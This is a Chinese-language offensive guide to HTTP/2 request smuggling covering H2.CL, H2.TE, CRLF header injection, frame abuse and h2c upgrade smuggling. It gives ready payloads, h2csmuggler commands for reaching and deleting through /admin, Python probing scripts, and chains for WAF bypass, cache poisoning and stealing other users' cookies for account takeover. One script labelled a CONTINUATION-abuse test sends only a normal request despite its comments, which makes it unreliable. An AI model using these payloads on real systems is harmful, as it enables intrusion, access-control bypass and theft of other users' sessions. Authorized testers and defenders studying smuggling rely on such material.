# HTTP/2 走私技术详解

> HTTP/2 的二进制帧协议引入了新的走私攻击面，尤其是在 HTTP/2 → HTTP/1.1 降级代理场景下

---

## 一、HTTP/2 走私攻击面总览

```
HTTP/2 走私类型：
├─ H2.CL — HTTP/2 前端 → HTTP/1.1 后端，注入 Content-Length
├─ H2.TE — HTTP/2 前端 → HTTP/1.1 后端，注入 Transfer-Encoding
├─ H2.0  — HTTP/2 exclusive smuggling（纯 H2 内部走私）
├─ CRLF in pseudo-headers — 利用 HTTP/2 伪头注入换行符
└─ H2C smuggling — HTTP/2 明文升级滥用（绕过反向代理）
```

---

## 二、H2.CL 攻击（HTTP/2 → HTTP/1.1 降级 + Content-Length 注入）

### 2.1 原理

```
HTTP/2 使用帧长度（DATA frame length）确定请求体大小，不需要 Content-Length 头。
但前端代理降级到 HTTP/1.1 时，会将 HTTP/2 的 headers 转换为 HTTP/1.1 头部。

如果前端不校验/不清理 HTTP/2 请求中手动设置的 content-length 头：
├─ 攻击者在 HTTP/2 请求中设置 content-length: 0
├─ 但实际 DATA 帧包含额外数据
├─ 前端按帧长度读取全部数据 → 转发到后端
├─ 后端按 Content-Length: 0 只读空体 → 剩余数据成为下一个请求前缀
└─ 走私成功
```

### 2.2 攻击 Payload

```
HTTP/2 请求帧:
:method: POST
:path: /
:authority: target.com
content-length: 0

[DATA frame 内容]:
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

后端（HTTP/1.1）看到：
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com

```

后端按 CL=0 处理第一个请求，`GET /admin` 被当作独立的第二个请求。

### 2.3 Burp Suite 手动构造

```
在 Burp Repeater 中:
1. 确保使用 HTTP/2（Inspector → Protocol → HTTP/2）
2. 手动添加 content-length: 0 头（Burp 允许在 HTTP/2 中设置）
3. 在请求体中写入走私的 HTTP/1.1 请求
4. 发送并观察响应

⛔ 关键点: 某些 CDN/代理会自动移除 HTTP/2 中的 content-length
   → 需要测试目标是否允许该头通过
```

---

## 三、H2.TE 攻击

### 3.1 原理

```
HTTP/2 规范禁止使用 transfer-encoding 头（HTTP/2 用帧机制代替分块传输）。
但某些前端代理在降级时不会移除 transfer-encoding 头。

攻击路径：
├─ 攻击者在 HTTP/2 请求中注入 transfer-encoding: chunked
├─ 前端忽略该头（HTTP/2 不使用 TE）
├─ 降级后后端收到 HTTP/1.1 请求，带有 transfer-encoding: chunked
├─ 后端按 chunked 解析 → 与实际 Content-Length 不一致
└─ 走私窗口打开
```

### 3.2 Payload 示例

```
HTTP/2 请求:
:method: POST
:path: /
:authority: target.com
content-length: 4
transfer-encoding: chunked

[DATA]:
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

---

## 四、HTTP/2 伪头 CRLF 注入

### 4.1 原理

```
HTTP/2 头部是二进制编码的 (HPACK)，理论上不存在 CRLF 问题。
但降级到 HTTP/1.1 时，头部值被直接拼接到文本格式中。

如果前端不对 HTTP/2 头部值进行 CRLF 过滤：
├─ 在伪头（:path, :authority）或普通头中注入 \r\n
├─ 降级后变成 HTTP/1.1 中的头部注入
├─ 可以注入任意头部甚至完整的走私请求
└─ 攻击威力极大
```

### 4.2 通过 :path 注入

```
HTTP/2 请求:
:method: GET
:path: / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX: x
:authority: target.com

降级后后端看到:
GET / HTTP/1.1
Host: target.com

GET /admin HTTP/1.1
Host: target.com
X: x HTTP/1.1
Host: target.com
```

### 4.3 通过普通头注入

```
HTTP/2 请求:
:method: POST
:path: /
:authority: target.com
foo: bar\r\nTransfer-Encoding: chunked

降级后:
POST / HTTP/1.1
Host: target.com
Foo: bar
Transfer-Encoding: chunked
```

### 4.4 Burp Suite 操作

```
Burp Repeater 中注入 CRLF:
1. 切换到 HTTP/2
2. 在 Inspector → Headers 中编辑头部值
3. 使用 \r\n 注入（Burp 允许在二进制模式下输入）
4. 或使用 Shift+Enter 在头部值中插入换行

⛔ 大多数现代代理已修复此问题，但仍有遗留系统存在
```

---

## 五、H2.0 — HTTP/2 Exclusive Smuggling

### 5.1 原理

```
不涉及 HTTP/1.1 降级，纯粹在 HTTP/2 层面走私。

场景: 前端和后端都使用 HTTP/2，但帧解析实现不一致

攻击面:
├─ DATA frame padding abuse
│   HTTP/2 DATA 帧支持 padding，不同实现对 padding 长度计算方式不同
├─ CONTINUATION frame abuse
│   HEADERS 帧设置 END_HEADERS=0 后，后续 CONTINUATION 帧处理不一致
├─ Stream multiplexing abuse
│   利用流优先级和依赖关系造成处理顺序差异
└─ PUSH_PROMISE 注入
    如果代理转发 PUSH_PROMISE 帧 → 可注入任意推送内容
```

### 5.2 CONTINUATION Flood / Abuse

```python
#!/usr/bin/env python3
"""HTTP/2 CONTINUATION frame abuse 检测脚本"""
import h2.connection
import h2.config
import h2.events
import socket, ssl

def test_continuation_abuse(host, port=443):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # 发送不完整的 HEADERS（END_HEADERS=0）
    # 然后发送多个 CONTINUATION 帧
    # 观察服务器行为差异
    sid = conn.get_next_available_stream_id()
    headers = [
        (':method', 'GET'),
        (':path', '/'),
        (':authority', host),
        (':scheme', 'https'),
    ]
    # 正常发送（用于对比）
    conn.send_headers(sid, headers, end_stream=True)
    sock.sendall(conn.data_to_send())

    data = sock.recv(65535)
    events = conn.receive_data(data)
    for event in events:
        if isinstance(event, h2.events.ResponseReceived):
            print(f"[+] Response headers: {dict(event.headers)}")
    sock.close()
```

---

## 六、H2C Smuggling（HTTP/2 Cleartext 升级走私）

### 6.1 原理

```
H2C（HTTP/2 Cleartext）允许通过 HTTP/1.1 Upgrade 头升级到 HTTP/2：

客户端发送:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

如果反向代理（如 Nginx/HAProxy）不理解 h2c 升级：
├─ 代理将请求转发到后端（原封不动）
├─ 后端支持 h2c → 升级到 HTTP/2
├─ 后续通信直接走 HTTP/2 → 绕过代理的 HTTP/1.1 层面检查
├─ 代理看不到升级后的请求内容
└─ 可访问代理禁止的内部路径（/admin, /internal）
```

### 6.2 h2csmuggler 工具

```bash
# 安装
pip3 install h2
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler

# 基本探测 — 检测目标是否支持 h2c 升级
python3 h2csmuggler.py -x https://target.com/ --test

# 通过 h2c 走私访问内部路径
python3 h2csmuggler.py -x https://target.com/ -t /admin
python3 h2csmuggler.py -x https://target.com/ -t /internal/api/users
python3 h2csmuggler.py -x https://target.com/ -t /server-status

# 指定方法和数据
python3 h2csmuggler.py -x https://target.com/ -t /admin/delete -m POST \
  -d '{"user":"victim"}'

# 使用自定义头
python3 h2csmuggler.py -x https://target.com/ -t /admin \
  -H "X-Forwarded-For: 127.0.0.1"

# 批量测试路径
python3 h2csmuggler.py -x https://target.com/ -w wordlist.txt
```

### 6.3 常见可利用场景

```
H2C 走私典型绕过：
├─ 反向代理 ACL 绕过 → 访问 /admin, /internal, /metrics
├─ WAF 绕过 → h2c 流量不经过 WAF 的 HTTP/1.1 规则引擎
├─ 认证绕过 → 前端认证在 HTTP/1.1 层面，升级后的 H2 请求不经过认证
├─ SSRF → 通过代理访问内网服务
└─ 信息泄露 → 访问 /server-status, /debug, /env 等内部端点

⛔ 关键条件：
├─ 反向代理需转发 Upgrade: h2c 头（不拦截/不理解）
├─ 后端服务需支持 h2c 升级
└─ 常见脆弱代理: 部分 Nginx 配置、AWS ALB（旧版）、Envoy（特定配置）
```

---

## 七、检测 HTTP/2 走私

### 7.1 Timing-based Detection

```
方法: 发送探测请求，测量响应时间差异

H2.CL 检测:
├─ 正常请求: 响应时间 T1
├─ 注入 CL=0 + 额外 DATA: 响应时间 T2
├─ 如果 T2 明显大于 T1 → 后端在等待下一个请求的数据到达
└─ 超时行为表明走私成功

H2C 检测:
├─ 发送 Upgrade: h2c 请求
├─ 响应 101 Switching Protocols → 后端支持 h2c
├─ 响应 200/400 但代理未拦截 Upgrade 头 → 可能存在走私
└─ 用 h2csmuggler --test 自动化
```

### 7.2 Differential Response Detection

```
方法: 走私一个会改变下一个请求响应的请求

步骤:
1. 发送走私请求: 前缀包含 GET /404-unique-path
2. 立即发送正常 GET / 请求
3. 如果正常请求返回 404 → 走私成功（响应被污染）

⛔ 注意: 可能影响其他用户，仅在授权测试中使用
```

### 7.3 Response Analysis

```python
#!/usr/bin/env python3
"""HTTP/2 走私检测 — 差异响应分析"""
import h2.connection
import h2.config
import h2.events
import socket, ssl, time

def detect_h2cl(host, port=443):
    """检测 H2.CL 走私"""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Test 1: 正常请求基准时间
    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [
        (':method', 'POST'), (':path', '/'),
        (':authority', host), (':scheme', 'https'),
        ('content-length', '5'),
    ])
    conn.send_data(sid, b'x=123', end_stream=True)
    sock.sendall(conn.data_to_send())

    t1 = time.time()
    data = sock.recv(65535)
    baseline = time.time() - t1
    sock.close()

    # Test 2: H2.CL 探测（CL=0 但发送数据）
    sock2 = socket.create_connection((host, port))
    sock2 = ctx.wrap_socket(sock2, server_hostname=host)
    conn2 = h2.connection.H2Connection(config=config)
    conn2.initiate_connection()
    sock2.sendall(conn2.data_to_send())

    sid2 = conn2.get_next_available_stream_id()
    conn2.send_headers(sid2, [
        (':method', 'POST'), (':path', '/'),
        (':authority', host), (':scheme', 'https'),
        ('content-length', '0'),
    ])
    # 发送额外数据 — 如果被走私，后端会等待下一个请求完成
    smuggled = b'GET /detect-h2cl-12345 HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n'
    conn2.send_data(sid2, smuggled, end_stream=True)
    sock2.sendall(conn2.data_to_send())

    t2 = time.time()
    sock2.settimeout(10)
    try:
        data2 = sock2.recv(65535)
        probe_time = time.time() - t2
    except socket.timeout:
        probe_time = 10.0
    sock2.close()

    print(f"[*] Baseline: {baseline:.3f}s | Probe: {probe_time:.3f}s")
    if probe_time > baseline * 3:
        print("[!] H2.CL smuggling likely — significant timing difference")
    else:
        print("[-] No obvious H2.CL smuggling detected")
```

---

## 八、工具速查

| 工具 | 用途 | 命令 |
|------|------|------|
| h2csmuggler | H2C 升级走私 | `python3 h2csmuggler.py -x URL -t /admin` |
| smuggler.py | 通用走私检测 | `python3 smuggler.py -u URL` |
| Burp HTTP Request Smuggler | 自动检测各类走私 | Burp Extension → Scan |
| Burp Repeater (HTTP/2) | 手动构造 H2 走私 | Inspector → 手动编辑头/Body |
| h2 (Python library) | 自定义 HTTP/2 帧操作 | `pip3 install h2` |
| nghttp2 | HTTP/2 调试客户端 | `nghttp -v https://target/` |
| curl --http2 | 快速 HTTP/2 测试 | `curl --http2 -v https://target/` |

---

## 九、实际利用场景

### 9.1 CDN/WAF 绕过

```
场景: CDN 使用 HTTP/2 接收请求 → 降级到 HTTP/1.1 转发到源站

利用:
├─ H2.CL 走私 → 绕过 CDN 的 WAF 规则
│   CDN 检查第一个请求（正常 POST /）→ 放行
│   走私的请求（GET /admin?cmd=...）直接到达源站
│
├─ H2C 走私 → 如果 CDN 转发 Upgrade 头
│   升级后的流量绕过 CDN 的所有 L7 检查
│
└─ CRLF in :path → 注入额外头部绕过 CDN 缓存键
    CDN 缓存被投毒 → 其他用户获取恶意响应
```

### 9.2 内部路由操控

```
场景: 微服务架构中，API Gateway 使用 HTTP/2 → 后端服务 HTTP/1.1

利用:
├─ 走私请求到不同的后端服务
├─ 修改 Host 头 → 路由到内部服务
├─ 注入 X-Forwarded-For: 127.0.0.1 → 绕过 IP 限制
└─ 走私请求到 /metrics, /health, /debug 端点
```

### 9.3 账户接管链

```
完整利用链:
1. 检测 H2.CL 走私存在
2. 走私请求窃取下一个用户的 Cookie/Token
   → 前缀注入: POST /log?stolen= → 下一个用户的请求拼接到参数
3. 使用窃取的 Token 登录受害者账户
4. 或走私 XSS payload → 下一个用户的响应包含恶意脚本
```

---

## 十、检测规避与注意事项

```
⛔ HTTP/2 走私会影响其他用户:
├─ 走私的请求前缀会拼接到下一个任意用户的请求
├─ 可能导致其他用户的请求失败 (500 错误)
├─ 在生产环境测试时必须极度谨慎
├─ 使用唯一标识符追踪你的走私请求
└─ 先用 timing 法确认 → 再进行实际利用

防御检测信号:
├─ 后端日志中出现畸形 HTTP/1.1 请求
├─ 异常的 Content-Length 或 Transfer-Encoding 头
├─ HTTP/2 请求中包含 HTTP/1.1 不允许的头
└─ CDN/代理错误率突增
```

---

## 参考链接

- [James Kettle - HTTP/2: The Sequel is Always Scarier (2021)](https://portswigger.net/research/http2)
- [BishopFox - h2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [HTTP/2 RFC 9113](https://www.rfc-editor.org/rfc/rfc9113)
- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
